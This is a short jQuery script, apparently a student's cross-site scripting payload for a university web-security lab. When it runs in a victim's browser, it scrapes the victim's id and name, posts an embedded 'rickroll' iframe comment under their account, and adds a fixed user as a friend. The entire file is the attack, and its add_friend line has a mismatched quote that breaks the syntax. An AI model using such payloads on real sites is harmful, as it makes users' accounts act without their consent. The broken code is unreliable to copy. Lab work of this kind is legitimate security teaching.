def func (){
$.ajax({
    type: 'GET',
    url: 'http://csec380-core.csec.rit.edu:86/home.php',
    success: function ( data ) {
        var id = data.match(/\.php\?id=([0-9]+)"/i)[1];
        var name = data.match(/id="name">([\w\s]+)</i)[1]
        $.ajax({
            type: 'GET',
            url: `http://csec380-core.csec.rit.edu:86/add_comment.php?id=${id}&comment=%3Ciframe%20width%3D%22560%22%20height%3D%22315%22%20src%3D%22https%3A%2F%2Fwww.youtube.com%2Fembed%2FdQw4w9WgXcQ%22%20title%3D%22YouTube%20video%20player%22%20frameborder%3D%220%22%20allow%3D%22accelerometer%3B%20autoplay%3B%20clipboard-write%3B%20encrypted-media%3B%20gyroscope%3B%20picture-in-picture%22%20allowfullscreen%3EWe%20are%20no%20strangers%20to%20love%2C%20${encodeURIComponent(name)}%3C%2Fiframe%3E`,
            success: function ( data ) {
                $.ajax({
            type: 'GET',
            url: `http://csec380-core.csec.rit.edu:86/add_friend.php?id=67',
            success: function ( data ) {
            }
            
                });
            }
            });
    }
});
}
